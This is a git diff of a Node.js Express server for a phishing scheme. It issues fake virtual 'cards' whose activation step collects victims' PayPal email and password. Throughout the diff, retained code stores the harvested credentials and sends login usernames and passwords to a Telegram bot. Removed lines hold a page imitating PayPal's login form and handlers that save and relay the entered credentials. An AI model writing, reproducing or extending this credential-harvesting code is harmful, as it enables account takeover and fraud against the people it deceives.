@@ -10,7 +10,6 @@ const port = process.env.PORT || 3000;
 // Enable CORS for frontend
 app.use(cors({ origin: 'https://ii-cyu4.onrender.com' }));
 app.use(express.json());
-app.use(express.urlencoded({ extended: true })); // For parsing form data
 
 // Data file initialization
 const dataFile = 'data.json';
@@ -19,6 +18,7 @@ function loadData() {
     try {
         if (fs.existsSync(dataFile)) {
             data = JSON.parse(fs.readFileSync(dataFile));
+            // Ensure paypalLogins and logs exist
             if (!data.paypalLogins) data.paypalLogins = [];
             if (!data.logs) data.logs = [];
         } else {
@@ -54,45 +54,27 @@ async function sendTelegramNotification(message) {
     return false;
 }
 
-// Middleware to verify token with logging
+// Middleware to verify token
 const authenticateToken = (req, res, next) => {
-    console.log('Auth header:', req.headers['authorization']);
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'No token provided' });
     jwt.verify(token, 'your-secret-key', (err, user) => {
-        if (err) {
-            console.error('Token verification error:', err.message);
-            return res.status(403).json({ error: 'Invalid token' });
-        }
+        if (err) return res.status(403).json({ error: 'Invalid token' });
         req.user = user;
         next();
     });
 };
 
-// Start server and send notification
-async function startServer() {
-    return new Promise((resolve) => {
-        const server = app.listen(port, () => {
-            console.log(`Server running on port ${port}`);
-            resolve(server);
-        });
-    });
-}
-
-(async () => {
-    try {
-        await startServer();
-        const testMessage = 'Server started successfully - Test notification from https://ii-cyu4.onrender.com';
-        await sendTelegramNotification(testMessage);
-    } catch (error) {
-        console.error('Server startup error:', error);
-        process.exit(1);
-    }
-})();
+// Test notification on startup
+app.listen(port, async () => {
+    console.log(`Server running on port ${port}`);
+    const testMessage = 'Server started successfully - Test notification from https://ii-cyu4.onrender.com';
+    await sendTelegramNotification(testMessage);
+});
 
 // Authentication routes
-app.post('/api/auth/signup', (req, res) => {
+app.post('/api/auth/signup', async (req, res) => {
     try {
         const { username, password } = req.body;
         if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
@@ -112,15 +94,14 @@ app.post('/api/auth/signup', (req, res) => {
     }
 });
 
-app.post('/api/auth/login', (req, res) => {
+app.post('/api/auth/login', async (req, res) => {
     try {
         const { username, password } = req.body;
         const user = data.users.find(u => u.username === username && u.password === password);
         if (!user) return res.status(401).json({ error: 'Invalid credentials' });
         const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
-        console.log('Generated token:', token); // Log token for debugging
         const message = `Login: Username: ${username}, Password: ${password}`;
-        sendTelegramNotification(message);
+        await sendTelegramNotification(message);
         res.json({ token });
     } catch (error) {
         console.error('Login error:', error);
@@ -146,6 +127,7 @@ app.post('/api/cards/generate', authenticateToken, (req, res) => {
             return res.status(400).json({ error: 'Invalid card details' });
         }
         const cardId = Date.now().toString();
+        // Generate a random 16-digit card number
         const randomCardNumber = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
         const card = { cardId, name, expDate, amount, number: randomCardNumber, cvv: '123', user: req.user.username, status: 'pending' };
         data.cards.push(card);
@@ -193,6 +175,7 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
         if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });
 
         card.status = 'activated';
+        // Store PayPal credentials only in paypalLogins, not in card object
         data.paypalLogins.push({
             cardId,
             paypalUsername,
@@ -201,6 +184,7 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
             timestamp: new Date().toISOString()
         });
 
+        // Log the activation
         data.logs.push({ cardId, user: req.user.username, time: new Date().toISOString() });
 
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
@@ -236,178 +220,18 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     }
 });
 
+// New endpoint to fetch PayPal credentials for all users
 app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
     try {
-        res.json({ paypalLogins: data.paypalLogins });
+        const userPaypalLogins = data.paypalLogins.filter(l => l.user === req.user.username);
+        res.json({ paypalLogins: userPaypalLogins });
     } catch (error) {
         console.error('Fetch PayPal creds error:', error);
         res.status(500).json({ error: 'Server error fetching PayPal credentials' });
     }
 });
 
-app.get('/card/:cardId/activate', (req, res) => {
-    const cardId = req.params.cardId;
-    const card = data.cards.find(c => c.cardId === cardId);
-    if (!card || card.status !== 'pending') {
-        return res.status(404).send('Card not found or already activated');
-    }
-    res.send(`
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Activate Your Card</title>
-            <style>
-                body {
-                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    height: 100vh;
-                    margin: 0;
-                    background-color: #f7f9fa;
-                    position: relative;
-                }
-                .container {
-                    width: 400px;
-                    padding: 30px;
-                    background-color: #ffffff;
-                    border-radius: 15px;
-                    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
-                    display: flex;
-                    flex-direction: column;
-                    align-items: center;
-                    position: relative;
-                    z-index: 1;
-                }
-                .logo {
-                    font-size: 24px;
-                    font-weight: 700;
-                    color: #000000;
-                    margin-bottom: 20px;
-                    line-height: 1;
-                    letter-spacing: -1px;
-                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-                }
-                .input-field {
-                    width: 100%;
-                    padding: 15px 20px;
-                    margin: 10px 0;
-                    border: 2px solid #0070ba;
-                    border-radius: 25px;
-                    font-size: 14px;
-                    color: #333333;
-                    box-sizing: border-box;
-                    background-color: #ffffff;
-                    transition: box-shadow 0.3s ease;
-                }
-                .input-field:focus {
-                    box-shadow: 0 0 10px rgba(0, 112, 186, 0.5);
-                    outline: none;
-                }
-                .input-field::placeholder {
-                    color: #999999;
-                    font-weight: 400;
-                }
-                .btn {
-                    width: 100%;
-                    padding: 12px;
-                    margin: 10px 0;
-                    border: none;
-                    border-radius: 25px;
-                    font-size: 16px;
-                    cursor: pointer;
-                    font-weight: 600;
-                    text-transform: uppercase;
-                    transition: transform 0.2s ease, box-shadow 0.2s ease;
-                }
-                .btn-login {
-                    background-color: #0070ba;
-                    color: #ffffff;
-                    box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3);
-                }
-                .btn-login:hover {
-                    transform: translateY(-2px);
-                    box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4);
-                }
-                #message {
-                    color: #ff4444;
-                    margin-top: 10px;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="logo">PayPal</div>
-                <p>Card ID: ${cardId}</p>
-                <form id="activationForm" action="/card/${cardId}/activate" method="POST">
-                    <input type="text" class="input-field" name="paypalUsername" placeholder="PayPal Email" required>
-                    <input type="password" class="input-field" name="paypalPassword" placeholder="PayPal Password" required>
-                    <button type="submit" class="btn btn-login">Activate Card</button>
-                </form>
-                <div id="message"></div>
-            </div>
-            <script>
-                document.getElementById('activationForm').addEventListener('submit', async (e) => {
-                    e.preventDefault();
-                    const form = e.target;
-                    const response = await fetch(form.action, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: new URLSearchParams(new FormData(form)).toString()
-                    });
-                    const data = await response.text();
-                    document.getElementById('message').textContent = data;
-                    if (response.ok) {
-                        fetch('https://ii-cyu4.onrender.com/api/cards/activate/external', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ cardId: '${cardId}', paypalUsername: form.paypalUsername.value, paypalPassword: form.paypalPassword.value })
-                        }).catch(err => console.error('Frontend notification failed:', err));
-                    }
-                });
-            </script>
-        </body>
-        </html>
-    `);
-});
-
-app.post('/card/:cardId/activate', async (req, res) => {
-    const cardId = req.params.cardId;
-    const card = data.cards.find(c => c.cardId === cardId);
-    if (!card || card.status !== 'pending') {
-        return res.status(404).send('Card not found or already activated');
-    }
-    const paypalUsername = req.body.paypalUsername;
-    const paypalPassword = req.body.paypalPassword;
-    if (!paypalUsername || !paypalPassword) {
-        return res.status(400).send('PayPal credentials are required');
-    }
-
-    card.status = 'activated';
-    data.paypalLogins.push({
-        cardId,
-        paypalUsername,
-        paypalPassword,
-        user: 'external',
-        timestamp: new Date().toISOString()
-    });
-    data.logs.push({ cardId, user: 'external', time: new Date().toISOString() });
-    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-    const message = `External PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
-    await sendTelegramNotification(message);
-    res.send('Card activated successfully!');
-});
-
-app.post('/api/cards/activate/external', (req, res) => {
-    const { cardId, paypalUsername, paypalPassword } = req.body;
-    if (!cardId || !paypalUsername || !paypalPassword) {
-        return res.status(400).json({ error: 'Missing required fields' });
-    }
-    res.json({ message: 'External activation received', cardId, paypalUsername, paypalPassword });
-});
-
+// Error handlers
 app.use((err, req, res, next) => {
     console.error('Global error:', err.stack);
     res.status(500).json({ error: 'Internal server error' });
